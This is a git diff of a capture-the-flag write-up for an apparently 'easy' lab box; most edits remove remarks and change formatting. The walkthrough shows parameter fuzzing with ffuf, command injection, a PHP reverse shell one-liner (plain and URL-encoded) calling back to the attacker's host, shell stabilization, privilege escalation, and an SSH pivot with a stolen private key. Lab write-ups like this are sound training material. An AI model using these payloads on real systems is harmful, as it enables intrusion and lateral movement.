@@ -23,8 +23,8 @@ The index.php shows a directory listing. Let's look at the source.
 
 ![PIC_INDEX_1](https://user-images.githubusercontent.com/93183445/141818220-71e224fc-9695-4f2c-bc05-f4efb6375f05.png)
 
-Looks like we're going to search for the path. At this point I try to keep in mind that this 
-box is marked as "easy"... Let's go for it!!
+Looks like we're going to search for the *path*.  
+Let's go for it!!
 
 Tried a few things, but didn't find anything with directory bruteforcing. Maybe it is a parameter?
 
@@ -35,32 +35,32 @@ size. Let's filter that out and see what happens:
 
 <code>ffuf -u http://10.10.163.146/index.php?FUZZ=a -w /usr/share/wordlists/dirb/common.txt -fs 329</code>
 
-The outcome was:\
+The outcome was:  
 <code>path                    [Status: 200, Size: 79, Words: 9, Lines: 11]</code>
 
 So we found the path.
-As we could view the directory listing earlier and this is a box marked as easy, I tried simple rce
+As we could view the directory listing earlier, I tried simple rce
 like id, whoami and so on. Nothing seemed to work.
 The only thing that gave something back, was `ls` and `pwd`
-(with backticks). So just the directory listing is enabled, it seems.\
-So why not try "/"? Bingo..\
-I'm able to see the directory listing of "/".\
-With this opportunity given, I wanted to take a look in the home directory.\
+(with backticks). So just the directory listing is enabled, it seems.  
+So why not try "/"? Bingo..  
+I'm able to see the directory listing of "/".  
+With this opportunity given, I wanted to take a look in the home directory.  
 So I found mike.
 
 ![PIC_MIKE](https://user-images.githubusercontent.com/93183445/141819141-6e26bff1-fa75-4ce1-9dd8-cb29e4da2a47.png)
 
 But mike wasn't of great use, since I couldn't read or list the content of ".ssh/".
 
-Still reminding me that this is a box marked as "easy", I tried command injection. With success:
+I tried command injection. With success:
 
 ![PIC_WHOAMI](https://user-images.githubusercontent.com/93183445/141819181-05119d8a-1653-4fed-bb16-85babe95f8df.png)
 
-It took me a few tries just to end up using php and url-encoding after I wasn't able to netcat or wget anything.\
-(Should have noticed earlier, because there's a lot of php going on..)\
+It took me a few tries just to end up using php and url-encoding after I wasn't able to netcat or wget anything.  
+(Should have noticed earlier, because there's a lot of php going on..)  
 Again, https://www.revshells.com to the rescue :)
 
-<code>php -r '$sock=fsockopen("MY-IP",9001);exec("sh <&3 >&3 2>&3");'</code>\
+<code>php -r '$sock=fsockopen("MY-IP",9001);exec("sh <&3 >&3 2>&3");'</code>  
 Urlencoded we get:\
 <code>php%20-r%20%27%24sock%3Dfsockopen%28%22MY-IP%22%2C9001%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27</code>
 
@@ -68,14 +68,14 @@ Add this to the URL in the browser after starting a listener, and we get a callb
 
 ![PIC_CALLBACK](https://user-images.githubusercontent.com/93183445/141820541-5533b0a1-1f27-4561-9500-106cb802d846.png)
 
-Stabilize the shell with python3:\
+Stabilize the shell with python3  
 <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code>
 
-Then check mike's home directory (remember the .ssh/ folder from before).\
-But we get a "Permission denied". We're still www-data. But there's a binary file we are allowed to execute.\
-Let's do that. Nothing happens. Except the fancy output telling us "CRYPTSHELL"..\
-Again, trying to keep in mind this being a simple box, I append "mike" for the execution of the binary.\
-This time, it took a few seconds to respond, so there's clearly something going on..\
+Then check mike's home directory (remember the .ssh/ folder from before).  
+But we get a "Permission denied". We're still www-data. But there's a binary file we are allowed to execute.  
+Let's do that. Nothing happens. Except the fancy output telling us "CRYPTSHELL"..  
+Again, trying to keep in mind this being a simple box, I append "mike" for the execution of the binary.  
+This time, it took a few seconds to respond, so there's clearly something going on..  
 Time for a search after files we are able to execute:
 
 ![PIC_CRYPT_1](https://user-images.githubusercontent.com/93183445/141819398-ead3d135-c25a-4df7-a6a2-c852c9080f5d.png)
@@ -88,21 +88,21 @@ Trying the same again with this binary, things take an interesting turn:
 
 ![PIC_CRYPT_3](https://user-images.githubusercontent.com/93183445/141819452-30f55aaa-1464-4f43-90d6-d4c042520acd.png)
 
-Welcome to the root-fest :).\
-But no luck, the root directory is pretty much empty..\
+Welcome to the root-fest :).  
+But no luck, the root directory is pretty much empty.  
 The hostname is "host1", so maybe there's a number2?
 
 The following just didn't work somehow..
 
 <code>for i in {1..254} ;do (ping -c 1 172.16.20.$i | grep "bytes from" &) ;done</code>
 
-I mean to some degree, because before it went on telling me
-that "Destination Host Unreachable", I saw that 172.16.20.6 was up.\
-So I had to stop the loop and reconnect.\
+I mean to some degree, because before it went on telling me  
+that "Destination Host Unreachable", I saw that 172.16.20.6 was up.  
+So I had to stop the loop and reconnect.  
 Note to self: *Better use the static nmap next time..* 
 
 Then, the first thing I tried was to connect with the id_rsa from mikes home directory to the newly
-found host (still kept in mind this is an easy box..):
+found host:
 
 <code>ssh -i /home/mike/.ssh/id_rsa mike@172.16.20.6</code>
 
